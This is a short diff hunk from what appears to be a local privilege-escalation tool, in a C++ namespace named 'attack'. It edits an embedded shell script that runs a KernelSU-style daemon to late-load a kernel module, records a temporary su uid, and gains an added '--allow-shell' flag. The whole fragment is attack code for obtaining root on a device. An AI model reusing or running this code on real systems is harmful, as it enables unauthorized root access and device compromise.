@@ -395,7 +395,7 @@ namespace lsprivilege::attack {
             "  fi\n"
             "  echo \"[*] late-load ${KMI_ARG:-auto}\" >>\"$LOG\"\n"
             "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "  \"$KSUD\" late-load $KMI_ARG >>\"$LOG\" 2>&1\n"
+            "  \"$KSUD\" late-load $KMI_ARG --allow-shell >>\"$LOG\" 2>&1\n"
             "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching ${MOD_NAME}.ko\" >>\"$LOG\"\n"
